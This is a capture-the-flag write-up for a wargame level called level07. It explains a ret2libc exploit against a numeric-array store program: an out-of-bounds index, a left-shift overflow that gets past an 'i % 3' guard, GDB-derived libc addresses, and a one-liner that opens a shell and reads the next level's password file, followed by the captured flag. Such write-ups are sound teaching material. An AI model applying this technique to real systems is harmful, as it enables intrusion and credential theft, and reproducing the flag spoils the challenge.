# level07

The executable runs an interactive loop, allowing us to write numeric values in a dedicated array.

We can't use `argv` or the `env`, because they're cleaned out by preemptive loops.

We can write outside of that array, using indexes that overflow 100 ; we'll use this to perform a `ret2libc` attack.

## **The exploit**

Just like in `level04`, we need the addresses of `system` and `"/bin/sh"`, which we can find in GDB with `print system` and `find __libc_start_main,+99999999,"/bin/sh"`.

We get `0xf7e6aed0` and `0xf7f897ec`, which we'll set at `eip` and `eip+8`.

By playing around in GDB, we find the unsigned int buffer starts at `0xffffd544`, with `eip` at `0xffffd70c`. This is an offset of `456`, which we divide by `4` since it's an unsigned int table, so `eip` is at `buf[114]`.

We start by inserting `"/bin/sh"` (`0xf7f897ec == 4160264172`) at `eip+8` (`116`) :

```
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
```

Good. Now let's do `system` (`0xf7e6aed0 == 4159090384`) at `eip` (`114`) :

```
Input command: store
 Number: 4159090384
 Index: 114
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
```

Problem : the `i % 3 == 0` prevents us for writing in `eip`. How can we circumvent this ?

The bitshift in `*(s + i << 2) = n;` shifts our index by 2 to multiply it by 4, a necessary conversion to index an unsigned int table. This is quite useful to us : it means the two most significant bits are lost, and we can set them to whatever we want and still get `114`.

```
00000000000000000000000001110010  ==  114
               vv
10000000000000000000000001110010  ==  2147483762
```

We try again with our new index `2147483762` :

```
Input command: store
 Number: 4159090384
 Index: 2147483762
 Completed store command successfully
```

If we `read` our indexes, we can see the values are correctly set. We run `quit`, and the console opens - the `ret2libc` works !

## **The flag**

We can condense our exploit into the following one-liner :

```
( echo store ; echo 4160264172 ; echo 116 ; echo store ; echo 4159090384 ; echo 2147483762 ; echo quit ; sleep .1 ; echo "cat /home/users/level08/.pass" ) | ./level07
```

We get the flag for `level07` :

```
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```